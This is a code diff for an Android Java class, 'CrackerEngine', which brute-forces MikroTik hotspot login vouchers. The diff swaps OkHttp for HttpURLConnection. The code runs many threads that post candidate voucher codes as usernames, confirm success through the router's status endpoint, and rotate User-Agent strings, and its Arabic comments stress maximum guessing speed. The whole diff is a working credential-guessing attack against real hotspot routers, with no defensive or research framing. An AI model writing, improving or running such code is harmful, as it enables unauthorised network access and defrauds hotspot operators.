@@ -1,10 +1,10 @@
 package com.example.mikrotikbrowser;
 
 import android.content.SharedPreferences;
-import java.io.IOException;
+import java.io.*;
+import java.net.*;
 import java.util.*;
 import java.util.concurrent.atomic.*;
-import okhttp3.*;
 import org.json.JSONObject;
 
 public class CrackerEngine {
@@ -37,13 +37,13 @@ public class CrackerEngine {
         this.listener = l; this.prefs = p; this.network = network;
         this.loginUrl = loginUrl;
         try {
-            this.baseUrl = new java.net.URL(loginUrl).getProtocol() + "://" + new java.net.URL(loginUrl).getHost();
+            this.baseUrl = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost();
         } catch (Exception e) { throw new RuntimeException("bad url"); }
         this.statusUrl = baseUrl + "/status?var=callBack";
         this.prefix = prefix != null ? prefix : "";
         this.suffix = suffix != null ? suffix : "";
         this.digits = digits; this.maxAttempts = maxAttempts;
-        this.threads = Math.max(1, Math.min(threads, 25)); // زيادة الحد الأقصى للخيوط
+        this.threads = Math.max(1, Math.min(threads, 20)); // رفع الحد الأقصى للخيوط
         this.pauseMs = Math.max(0, pauseMs); // السماح بالتأخير الصفري
         this.retryDelay = retryDelay;
         this.tried = Collections.synchronizedSet(loadTried());
@@ -71,14 +71,14 @@ public class CrackerEngine {
 
     private void runEngine() {
         try {
-            log("▶ بدء التخمين فائق السرعة (OkHttp)");
+            log("▶ بدء التخمين (السرعة القصوى - خيوط متعددة)");
             log("  الخيوط: " + threads + " | التأخير: " + pauseMs + "ms");
 
             log("→ تسجيل خروج...");
             try {
-                OkHttpClient temp = new OkHttpClient();
-                Request r = new Request.Builder().url(baseUrl + "/logout?erase-cookie=yes&var=callBack").build();
-                temp.newCall(r).execute().close();
+                HttpURLConnection c = (HttpURLConnection) new URL(baseUrl + "/logout?erase-cookie=yes&var=callBack").openConnection();
+                c.setConnectTimeout(3000); c.setReadTimeout(3000);
+                c.getResponseCode(); c.disconnect();
             } catch (Exception e) {}
             sleep(1000);
 
@@ -108,18 +108,9 @@ public class CrackerEngine {
     }
 
     private void workerLoop(int id) {
-        // كل خيط يمتلك OkHttpClient خاص به (لضمان جلسات منفصلة وسرعة قصوى)
-        OkHttpClient client = new OkHttpClient.Builder()
-                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
-                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
-                .retryOnConnectionFailure(true)
-                .build();
-
         while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
-            // جلسة جديدة: مسح الكوكيز السابقة
-            client.cookieJar().evictAll();
-            
-            Map<String, String> template = openSession(client, id);
+            Map<String, String> cookies = new HashMap<>();
+            Map<String, String> template = openSession(cookies, id);
             if (template == null) {
                 sleep(500);
                 continue;
@@ -135,7 +126,7 @@ public class CrackerEngine {
                 listener.onProgress(cur, maxAttempts, v);
                 log("[W" + id + "] 🔍 " + v);
                 
-                Result r = tryLogin(client, template, v);
+                Result r = tryLogin(cookies, template, v);
                 if (stopped.get() || found.get()) return;
                 
                 if (r.busy) {
@@ -162,21 +153,36 @@ public class CrackerEngine {
         }
     }
 
-    private Map<String, String> openSession(OkHttpClient client, int wid) {
+    private Map<String, String> openSession(Map<String, String> cookies, int wid) {
         if (stopped.get()) return null;
+        String ua = ua();
         try {
-            Request req = new Request.Builder()
-                    .url(loginUrl)
-                    .header("User-Agent", ua())
-                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-                    .build();
-            try (Response res = client.newCall(req).execute()) {
-                if (res.body() == null) return null;
-                String html = res.body().string();
-                return extractFields(html, wid);
-            }
+            HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
+            c1.setConnectTimeout(3000); c1.setReadTimeout(3000);
+            c1.setRequestProperty("User-Agent", ua);
+            c1.setRequestProperty("Connection", "keep-alive");
+            c1.getResponseCode();
+            extractCookies(c1, cookies);
+            c1.disconnect();
+            if (stopped.get()) return null;
+
+            HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
+            c2.setConnectTimeout(3000); c2.setReadTimeout(3000);
+            c2.setRequestProperty("User-Agent", ua);
+            c2.setRequestProperty("Connection", "keep-alive");
+            String ck = cookiesStr(cookies);
+            if (!ck.isEmpty()) c2.setRequestProperty("Cookie", ck);
+            
+            int code2 = c2.getResponseCode();
+            InputStream is2 = (code2 >= 400) ? c2.getErrorStream() : c2.getInputStream();
+            String html = "";
+            if (is2 != null) html = read(is2);
+            extractCookies(c2, cookies);
+            c2.disconnect();
+
+            return extractFields(html, wid);
         } catch (Exception e) {
-            if (!stopped.get()) log("[W" + wid + "] ⚠ خطأ اتصال: " + e.getMessage());
+            if (!stopped.get()) log("[W" + wid + "] ⚠ اتصال: " + e.getMessage());
             return null;
         }
     }
@@ -184,12 +190,13 @@ public class CrackerEngine {
     private Map<String, String> extractFields(String html, int wid) {
         Map<String, String> fields = new LinkedHashMap<>();
         java.util.regex.Pattern p = java.util.regex.Pattern.compile(
-                "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
-                java.util.regex.Pattern.CASE_INSENSITIVE);
+            "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
+            java.util.regex.Pattern.CASE_INSENSITIVE);
         java.util.regex.Matcher m = p.matcher(html);
         while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
         
         if (fields.isEmpty()) {
+            log("[W" + wid + "] ℹ لا يوجد <form> — استخدام الحقول الافتراضية");
             fields.put("username", "");
             fields.put("password", "");
             fields.put("dst", baseUrl + "/");
@@ -202,51 +209,77 @@ public class CrackerEngine {
         return fields;
     }
 
-    private Result tryLogin(OkHttpClient client, Map<String, String> template, String voucher) {
+    private Result tryLogin(Map<String, String> cookies, Map<String, String> template, String voucher) {
         if (stopped.get()) return Result.bad("stopped");
+        String ua = ua();
         try {
-            FormBody.Builder formBuilder = new FormBody.Builder();
-            for (Map.Entry<String, String> e : template.entrySet()) {
-                formBuilder.add(e.getKey(), e.getValue());
+            Map<String, String> fields = new LinkedHashMap<>(template);
+            fields.put("username", voucher);
+            fields.put("password", "");
+
+            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
+            c.setRequestMethod("POST");
+            c.setDoOutput(true);
+            c.setInstanceFollowRedirects(false);
+            // تقليل وقت الانتظار إلى 3 ثوانٍ لكي نتجاوز الاتصالات الميتة بسرعة
+            c.setConnectTimeout(3000); c.setReadTimeout(3000);
+            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            c.setRequestProperty("User-Agent", ua);
+            c.setRequestProperty("Connection", "keep-alive");
+            c.setRequestProperty("Referer", loginUrl);
+            String ck = cookiesStr(cookies);
+            if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
+
+            StringBuilder sb = new StringBuilder();
+            for (Map.Entry<String, String> e : fields.entrySet()) {
+                if (sb.length() > 0) sb.append("&");
+                sb.append(URLEncoder.encode(e.getKey(), "UTF-8"))
+                  .append("=")
+                  .append(URLEncoder.encode(e.getValue(), "UTF-8"));
             }
-            formBuilder.add("username", voucher);
-            formBuilder.add("password", "");
+            OutputStream os = c.getOutputStream();
+            os.write(sb.toString().getBytes("UTF-8"));
+            os.flush(); os.close();
 
-            Request req = new Request.Builder()
-                    .url(loginUrl)
-                    .post(formBuilder.build())
-                    .header("User-Agent", ua())
-                    .header("Referer", loginUrl)
-                    .header("Origin", baseUrl)
-                    .build();
+            int code = c.getResponseCode();
+            extractCookies(c, cookies);
+            String body = "";
+            try {
+                InputStream is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
+                if (is != null) body = read(is);
+            } catch (Exception e) {}
+            c.disconnect();
 
-            try (Response res = client.newCall(req).execute()) {
-                if (res.body() == null) return Result.bad("empty body");
-                String body = res.body().string();
-                String low = body.toLowerCase();
+            if (stopped.get()) return Result.bad("stopped");
 
-                if (low.contains("already authorizing")) return Result.busy("already authorizing");
-                if (low.contains("invalid") || low.contains("error") || low.contains("wrong") || low.contains("denied"))
-                    return Result.bad("خاطئ");
-
-                // التحقق فقط إذا لم يكن هناك خطأ صريح
-                sleep(50);
-                Request statReq = new Request.Builder()
-                        .url(statusUrl)
-                        .header("User-Agent", ua())
-                        .build();
-                try (Response statRes = client.newCall(statReq).execute()) {
-                    if (statRes.body() != null) {
-                        String statusBody = statRes.body().string();
-                        JSONObject o = new JSONObject(statusBody);
-                        String li = o.optString("logged_in", "").toLowerCase();
-                        String un = o.optString("username", "").trim();
-                        if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
-                            return Result.ok(statusBody);
-                    }
-                }
-                return Result.bad(null);
+            String low = body.toLowerCase();
+            if (body.contains("already authorizing") || low.contains("already authorizing"))
+                return Result.busy("already authorizing");
+            
+            if (low.contains("invalid") || low.contains("error") 
+                || low.contains("wrong") || low.contains("denied")) {
+                return Result.bad("خاطئ");
             }
+
+            // فحص الحالة
+            sleep(50);
+            HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
+            c4.setConnectTimeout(3000); c4.setReadTimeout(3000);
+            c4.setRequestProperty("User-Agent", ua);
+            String ck2 = cookiesStr(cookies);
+            if (!ck2.isEmpty()) c4.setRequestProperty("Cookie", ck2);
+            String statusBody = read(c4.getInputStream());
+            c4.disconnect();
+
+            try {
+                JSONObject o = new JSONObject(statusBody);
+                String li = o.optString("logged_in", "").toLowerCase();
+                String un = o.optString("username", "").trim();
+                if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
+                    return Result.ok(statusBody);
+            } catch (Exception e) {}
+            
+            return Result.bad(null);
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
@@ -280,12 +313,45 @@ public class CrackerEngine {
         return null;
     }
 
+    private void extractCookies(HttpURLConnection c, Map<String, String> store) {
+        Map<String, List<String>> h = c.getHeaderFields();
+        for (Map.Entry<String, List<String>> e : h.entrySet()) {
+            if (e.getKey() != null && e.getKey().equalsIgnoreCase("Set-Cookie")) {
+                for (String line : e.getValue()) {
+                    int eq = line.indexOf('=');
+                    if (eq < 0) continue;
+                    int semi = line.indexOf(';', eq);
+                    String n = line.substring(0, eq).trim();
+                    String v = semi > 0 ? line.substring(eq + 1, semi).trim() : line.substring(eq + 1).trim();
+                    store.put(n, v);
+                }
+            }
+        }
+    }
+
+    private String cookiesStr(Map<String, String> store) {
+        StringBuilder sb = new StringBuilder();
+        for (Map.Entry<String, String> e : store.entrySet()) {
+            if (sb.length() > 0) sb.append("; ");
+            sb.append(e.getKey()).append("=").append(e.getValue());
+        }
+        return sb.toString();
+    }
+
     private String ua() {
         String[] a = {
-                "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0 Mobile Safari/537.36",
-                "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36"
         };
         return a[rng.nextInt(a.length)];
+    }
+
+    private String read(InputStream is) throws IOException {
+        ByteArrayOutputStream b = new ByteArrayOutputStream();
+        byte[] buf = new byte[4096];
+        int n;
+        while ((n = is.read(buf)) > 0) b.write(buf, 0, n);
+        return b.toString("UTF-8");
     }
 
     private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
